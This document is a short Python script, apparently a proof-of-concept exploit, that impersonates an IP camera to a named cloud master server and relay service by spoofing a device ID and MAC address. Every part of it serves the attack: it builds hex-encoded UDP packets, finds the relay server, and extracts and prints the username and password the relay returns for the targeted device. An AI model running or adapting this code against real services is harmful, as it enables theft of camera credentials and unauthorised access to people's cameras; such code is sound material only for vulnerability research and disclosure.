#!/usr/bin/python3
import socket
import time
import struct
import sys

def send_data(data, s, addr, port):   
    s.sendto(data,(addr, port))
    response = s.recvfrom(4096, 0)
    return response[0]

DEVICEID = sys.argv[1]
DEVICEMACADDR = '111111111111'
MASTER_SERVER = 'ipc1300.av380.net'
MASTER_PORT = 8877

s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
# Advertise a new camera deviceID and mac addr to the master server
print (f'[*] Advertise a new camera on the network to master server with device ID: {DEVICEID}.')
data = '02070032303038333131323334333734313100020c17222d0000'
data += bytes(DEVICEID, 'utf-8').hex()
data += '2e6e766476722e6e65740000000000000000000000000000'
data += bytes(DEVICEMACADDR, 'utf-8').hex()
data += '8a1bc0a801096762230a93f5d100'
data = bytes.fromhex(data)
result = send_data(data, s, MASTER_SERVER, MASTER_PORT)
# print (f'Received response from server: {result}') #debugging

print (f'[*] Waiting for master server to respond with relay server to use...')
# Listen for a request from master to request a relay and parse out the IP address and Port of the relay server
result = (s.recvfrom(4096, 0))[0]
# print (f'Received response from server: {result}') #debugging
start_ip = 33
end_ip = result.find(b'\x00', start_ip)
relay_ip_addr = result[start_ip:end_ip].decode('utf-8')
start_port = 50
end_port = start_port + 2
relay_port = result[start_port:end_port]
relay_port = struct.unpack('<H', relay_port)
relay_port = relay_port[0]
print (f'\u001b[32m[+] Relay server address found: {relay_ip_addr}:{relay_port}\u001b[37m')

# Connect to relay server and advertise that we are a camera
print (f'[*] Advertise the camera to the relay server with device ID: {DEVICEID}.')
data = '32'
data += bytes(DEVICEID, 'utf-8').hex()
data += '2e6e766476722e6e65740000000000000000000000000000302e302e302e30000000000000000000018a1bc4d62f4a41ae000000000000'
data = bytes.fromhex(data)
relay_s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
result = send_data(data, relay_s, relay_ip_addr, relay_port)
# print (f'[+] Received response from server: {result}') #debugging
# Check if the result has a username and password
if result[0] == 0xa7:
    # split out the username and password from the result
    username_start = 8
    password_start = 0x3a
    username = result[username_start:username_start+50].decode('utf-8')
    password = result[password_start:password_start+50].decode('utf-8')
    print (f'\u001b[32m[+] DeviceID: {DEVICEID}')
    print (f'[+] Username: {username}')
    print (f'[+] Password: {password}\u001b[37m')
else:
    print (f'[*] Unknown packet received: {result}')



# TODO 1)
# check if the relay server is valid:
# if packet starts with 0xcd it is a bad packet (contains our ip address)
# if packet starts with 0xcf contains a real relay server ip address

# TODO 2)
# repeat the camera advertisement to the master server periodically

# TODO 3)
# if we receive credentials for a device, stop advertising